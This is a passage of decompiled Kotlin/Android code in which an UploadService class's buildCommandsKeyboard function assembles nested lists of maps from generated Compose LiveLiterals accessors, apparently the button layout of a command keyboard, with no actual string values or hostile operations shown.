LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱۳String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$3$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۰۱String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$3$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵۳String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$3$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۸۰String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$3$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳۲String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$3$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۲۰String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$3$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷۲String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$3$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۶۲String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$4$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱۴String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$4$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۰۲String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$4$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵۴String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$4$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۸۱String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$4$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳۳String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$4$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۲۱String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$4$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷۳String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$4$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۶۳String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$5$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱۵String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$5$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۰۳String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$5$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵۵String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$5$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۸۲String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$5$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳۴String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$5$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۲۲String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$5$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷۴String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$5$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۶۴String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$6$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱۶String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$6$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۰۴String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$6$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵۶String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$6$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۸۳String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$6$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳۵String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$6$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۲۳String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$6$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷۵String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$6$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۶۵String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$7$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱۷String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$7$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۰۵String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$7$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵۷String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$7$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۸۴String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$7$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳۶String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$7$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۲۴String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$7$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷۶String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$7$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۶۶String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$8$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱۸String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$8$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۰۶String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$8$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵۸String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$8$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۸۵String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$8$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳۷String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$8$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۲۵String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$8$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷۷String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$8$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۶۷String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$9$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱۹String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$9$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۰۷String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$9$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵۹String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$9$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۸۶String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$9$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳۸String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$9$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۲۶String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$9$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷۸String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$9$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۵۲String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$10$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰۴String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$10$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۹۲String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$10$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴۴String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$10$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۷۱String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$10$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲۳String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$10$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۱۱String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$10$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶۳String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$10$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۵۳String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$11$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰۵String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$11$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۹۳String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$11$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴۵String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$11$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۷۲String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$11$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲۴String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$11$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۱۲String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$11$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶۴String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$11$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۵۴String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$12$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰۶String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$12$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۹۴String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$12$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴۶String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$12$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۷۳String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$12$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲۵String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$12$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۱۳String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$12$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶۵String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$12$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۸۸String$$$this$callto$0$vararg$arg0$callmapOf$arg0$calllistOf$13$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴۰String$arg0$callto$0$vararg$arg0$callmapOf$arg0$calllistOf$13$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۲۸String$$$this$callto$1$vararg$arg0$callmapOf$arg0$calllistOf$13$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۸۰String$arg0$callto$1$vararg$arg0$callmapOf$arg0$calllistOf$13$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})), CollectionsKt.listOf(MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۸۹String$$$this$callto$0$vararg$arg0$callmapOf$arg0$calllistOf$14$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴۱String$arg0$callto$0$vararg$arg0$callmapOf$arg0$calllistOf$14$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۲۹String$$$this$callto$1$vararg$arg0$callmapOf$arg0$calllistOf$14$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۸۱String$arg0$callto$1$vararg$arg0$callmapOf$arg0$calllistOf$14$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۵۵String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$15$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰۷String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$15$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۹۵String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$15$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴۷String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$15$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۷۴String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$15$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲۶String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$15$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۱۴String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$15$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶۶String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$15$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۵۶String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$16$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰۸String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$16$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۹۶String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$16$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴۸String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$16$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۷۵String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$16$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲۷String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$16$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۱۵String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$16$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶۷String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$16$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new 